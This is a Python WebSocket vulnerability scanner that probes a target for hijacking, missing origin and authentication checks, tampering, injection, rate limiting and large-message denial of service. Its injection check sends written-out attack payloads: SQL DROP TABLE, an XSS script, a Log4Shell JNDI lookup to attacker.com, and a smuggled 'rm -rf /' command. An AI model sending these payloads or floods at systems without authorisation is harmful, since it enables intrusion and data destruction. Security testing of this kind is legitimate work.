"""
WebSocket Vulnerability Scanner
================================

Comprehensive WebSocket security testing module
Detects WebSocket-specific vulnerabilities

Author: AI Pentest Brain Team
Version: 1.0
"""

import asyncio
import json
import logging
from typing import Dict, List, Optional
from urllib.parse import urlparse

# Try to import websocket library
try:
    import websockets
    WEBSOCKETS_AVAILABLE = True
except ImportError:
    WEBSOCKETS_AVAILABLE = False
    print("[INFO] websockets library not available. Install: pip install websockets")

logger = logging.getLogger(__name__)


class WebSocketScanner:
    """
    WebSocket-specific vulnerability scanner
    Covers all major WebSocket attack vectors
    """
    
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.ws_url = self._convert_to_ws_url(target_url)
        
        # Common WebSocket endpoints
        self.common_endpoints = [
            '/ws',
            '/socket',
            '/websocket',
            '/api/ws',
            '/api/socket',
            '/chat',
            '/stream',
            '/live'
        ]
    
    def _convert_to_ws_url(self, url: str) -> str:
        """Convert HTTP URL to WebSocket URL"""
        if url.startswith('https://'):
            return url.replace('https://', 'wss://')
        elif url.startswith('http://'):
            return url.replace('http://', 'ws://')
        return url
    
    def scan_all(self) -> List[Dict]:
        """Run all WebSocket vulnerability scans"""
        if not WEBSOCKETS_AVAILABLE:
            return [{
                'type': 'websocket_library_missing',
                'severity': 'INFO',
                'description': 'WebSocket scanning unavailable - install websockets library',
                'recommendation': 'Run: pip install websockets'
            }]
        
        logger.info(f"Starting WebSocket vulnerability scan on {self.target_url}")
        
        vulnerabilities = []
        
        # Find WebSocket endpoint
        endpoint = asyncio.run(self._find_websocket_endpoint())
        if not endpoint:
            logger.info("No WebSocket endpoint found")
            return vulnerabilities
        
        logger.info(f"WebSocket endpoint found: {endpoint}")
        
        # Run all checks
        vulnerabilities.extend(asyncio.run(self._check_csrf(endpoint)))
        vulnerabilities.extend(asyncio.run(self._check_origin_validation(endpoint)))
        vulnerabilities.extend(asyncio.run(self._check_authentication(endpoint)))
        vulnerabilities.extend(asyncio.run(self._check_message_tampering(endpoint)))
        vulnerabilities.extend(asyncio.run(self._check_injection(endpoint)))
        vulnerabilities.extend(asyncio.run(self._check_rate_limiting(endpoint)))
        vulnerabilities.extend(asyncio.run(self._check_dos(endpoint)))
        
        return vulnerabilities
    
    async def _find_websocket_endpoint(self) -> Optional[str]:
        """Find WebSocket endpoint"""
        for path in self.common_endpoints:
            url = self.ws_url.rstrip('/') + path
            
            try:
                async with websockets.connect(url, timeout=5) as ws:
                    # Try sending a ping
                    await ws.ping()
                    return url
            except:
                continue
        
        return None
    
    async def _check_csrf(self, endpoint: str) -> List[Dict]:
        """Check for Cross-Site WebSocket Hijacking (CSWSH)"""
        vulnerabilities = []
        
        try:
            # Try connecting without any CSRF token
            async with websockets.connect(endpoint, timeout=5) as ws:
                # If connection succeeds without token, it's vulnerable
                await ws.send(json.dumps({"action": "test"}))
                response = await ws.recv()
                
                if response:
                    vulnerabilities.append({
                        'type': 'websocket_csrf',
                        'severity': 'HIGH',
                        'endpoint': endpoint,
                        'description': 'WebSocket CSRF - No token validation on connection',
                        'impact': 'Attacker can hijack WebSocket connections from victim browsers',
                        'evidence': 'WebSocket connection established without CSRF token',
                        'recommendation': 'Require CSRF token in initial handshake or first message',
                        'cwe': 'CWE-352: Cross-Site Request Forgery (CSRF)'
                    })
        
        except Exception as e:
            logger.debug(f"CSRF check error: {str(e)}")
        
        return vulnerabilities
    
    async def _check_origin_validation(self, endpoint: str) -> List[Dict]:
        """Check for missing Origin validation"""
        vulnerabilities = []
        
        malicious_origins = [
            'http://evil.com',
            'http://attacker.com',
            'null',
            'file://'
        ]
        
        for origin in malicious_origins:
            try:
                # Try connecting with malicious origin
                headers = {'Origin': origin}
                async with websockets.connect(
                    endpoint, 
                    extra_headers=headers,
                    timeout=5
                ) as ws:
                    # If connection succeeds, origin validation is missing
                    await ws.ping()
                    
                    vulnerabilities.append({
                        'type': 'websocket_missing_origin_validation',
                        'severity': 'HIGH',
                        'endpoint': endpoint,
                        'description': 'WebSocket accepts connections from any origin',
                        'impact': 'Cross-origin attacks possible from malicious websites',
                        'evidence': f'Accepted connection with Origin: {origin}',
                        'recommendation': 'Validate Origin header and reject unauthorized origins',
                        'cwe': 'CWE-346: Origin Validation Error'
                    })
                    break  # Found vulnerability, no need to test others
            
            except:
                continue
        
        return vulnerabilities
    
    async def _check_authentication(self, endpoint: str) -> List[Dict]:
        """Check for missing authentication"""
        vulnerabilities = []
        
        try:
            # Try connecting without authentication
            async with websockets.connect(endpoint, timeout=5) as ws:
                # Try to access sensitive data
                sensitive_actions = [
                    {"action": "getUsers"},
                    {"action": "getAdminData"},
                    {"action": "getPrivateData"},
                    {"cmd": "list_users"}
                ]
                
                for action in sensitive_actions:
                    await ws.send(json.dumps(action))
                    try:
                        response = await asyncio.wait_for(ws.recv(), timeout=2)
                        data = json.loads(response)
                        
                        # If we got data without auth
                        if 'error' not in str(data).lower():
                            vulnerabilities.append({
                                'type': 'websocket_missing_authentication',
                                'severity': 'CRITICAL',
                                'endpoint': endpoint,
                                'description': 'WebSocket allows unauthenticated access to sensitive operations',
                                'impact': 'Unauthorized access to sensitive data and operations',
                                'evidence': f'Executed action without auth: {action}',
                                'recommendation': 'Implement authentication before allowing any operations',
                                'cwe': 'CWE-306: Missing Authentication'
                            })
                            break
                    except:
                        continue
        
        except Exception as e:
            logger.debug(f"Authentication check error: {str(e)}")
        
        return vulnerabilities
    
    async def _check_message_tampering(self, endpoint: str) -> List[Dict]:
        """Check for message tampering vulnerabilities"""
        vulnerabilities = []
        
        try:
            async with websockets.connect(endpoint, timeout=5) as ws:
                # Try to send malformed messages
                tampered_messages = [
                    '{"userId": "admin"}',  # Try to impersonate
                    '{"userId": 1, "isAdmin": true}',  # Privilege escalation
                    '{"userId": "../admin"}',  # Path traversal
                ]
                
                for msg in tampered_messages:
                    await ws.send(msg)
                    try:
                        response = await asyncio.wait_for(ws.recv(), timeout=2)
                        
                        # Check if tampering was successful
                        if 'admin' in response.lower() and 'error' not in response.lower():
                            vulnerabilities.append({
                                'type': 'websocket_message_tampering',
                                'severity': 'HIGH',
                                'endpoint': endpoint,
                                'description': 'WebSocket messages can be tampered with',
                                'impact': 'Attacker can manipulate message content for unauthorized access',
                                'evidence': f'Tampered message accepted: {msg}',
                                'recommendation': 'Implement message signing and validation',
                                'cwe': 'CWE-345: Insufficient Verification of Data Authenticity'
                            })
                            break
                    except:
                        continue
        
        except Exception as e:
            logger.debug(f"Message tampering check error: {str(e)}")
        
        return vulnerabilities
    
    async def _check_injection(self, endpoint: str) -> List[Dict]:
        """Check for injection vulnerabilities"""
        vulnerabilities = []
        
        injection_payloads = [
            """{"message": "'; DROP TABLE users--"}""",
            """{"message": "<script>alert('XSS')</script>"}""",
            """{"message": "${jndi:ldap://attacker.com/a}"}""",
            """{"command": "ls; rm -rf /"}""",
        ]
        
        try:
            async with websockets.connect(endpoint, timeout=5) as ws:
                for payload in injection_payloads:
                    await ws.send(payload)
                    try:
                        response = await asyncio.wait_for(ws.recv(), timeout=2)
                        
                        # Check if payload is reflected
                        if any(p in response for p in ['<script>', 'DROP TABLE', 'jndi']):
                            vulnerabilities.append({
                                'type': 'websocket_injection',
                                'severity': 'HIGH',
                                'endpoint': endpoint,
                                'description': 'WebSocket injection vulnerability detected',
                                'impact': 'Possible injection attacks through WebSocket messages',
                                'evidence': f'Payload reflected: {payload}',
                                'recommendation': 'Implement strict input validation and output encoding',
                                'cwe': 'CWE-74: Injection'
                            })
                            break
                    except:
                        continue
        
        except Exception as e:
            logger.debug(f"Injection check error: {str(e)}")
        
        return vulnerabilities
    
    async def _check_rate_limiting(self, endpoint: str) -> List[Dict]:
        """Check for rate limiting"""
        vulnerabilities = []
        
        try:
            async with websockets.connect(endpoint, timeout=5) as ws:
                # Send many messages quickly
                message_count = 50
                successful_sends = 0
                
                for i in range(message_count):
                    try:
                        await ws.send(json.dumps({"test": i}))
                        successful_sends += 1
                    except:
                        break
                
                # If most messages went through, rate limiting is weak/missing
                if successful_sends >= message_count * 0.9:
                    vulnerabilities.append({
                        'type': 'websocket_no_rate_limiting',
                        'severity': 'MEDIUM',
                        'endpoint': endpoint,
                        'description': 'No rate limiting on WebSocket messages',
                        'impact': 'Vulnerable to spam and DoS attacks',
                        'evidence': f'{successful_sends}/{message_count} messages sent successfully',
                        'recommendation': 'Implement rate limiting (e.g., 10 messages per second)',
                        'cwe': 'CWE-770: Allocation of Resources Without Limits'
                    })
        
        except Exception as e:
            logger.debug(f"Rate limiting check error: {str(e)}")
        
        return vulnerabilities
    
    async def _check_dos(self, endpoint: str) -> List[Dict]:
        """Check for DoS vulnerabilities"""
        vulnerabilities = []
        
        try:
            async with websockets.connect(endpoint, timeout=5) as ws:
                # Try sending very large message
                large_message = "A" * 10000000  # 10MB
                
                try:
                    await ws.send(large_message)
                    response = await asyncio.wait_for(ws.recv(), timeout=5)
                    
                    vulnerabilities.append({
                        'type': 'websocket_dos',
                        'severity': 'MEDIUM',
                        'endpoint': endpoint,
                        'description': 'WebSocket accepts extremely large messages',
                        'impact': 'Vulnerable to DoS via resource exhaustion',
                        'evidence': '10MB message accepted',
                        'recommendation': 'Implement message size limits (e.g., max 1MB)',
                        'cwe': 'CWE-400: Uncontrolled Resource Consumption'
                    })
                except asyncio.TimeoutError:
                    # Timeout might indicate protection
                    pass
        
        except Exception as e:
            logger.debug(f"DoS check error: {str(e)}")
        
        return vulnerabilities


# Test function
if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO)
    
    print("="*70)
    print("WebSocket Vulnerability Scanner - Test")
    print("="*70 + "\n")
    
    if not WEBSOCKETS_AVAILABLE:
        print("[!] websockets library not installed")
        print("[i] Install with: pip install websockets")
    else:
        # Example usage
        target = "http://localhost:8080"  # Replace with actual WebSocket server
        scanner = WebSocketScanner(target)
        
        vulnerabilities = scanner.scan_all()
        
        print(f"\n[+] Found {len(vulnerabilities)} WebSocket vulnerabilities\n")
        
        for vuln in vulnerabilities:
            print(f"Type: {vuln['type']}")
            print(f"Severity: {vuln['severity']}")
            print(f"Description: {vuln['description']}")
            print(f"Recommendation: {vuln['recommendation']}")
            print("-" * 70)
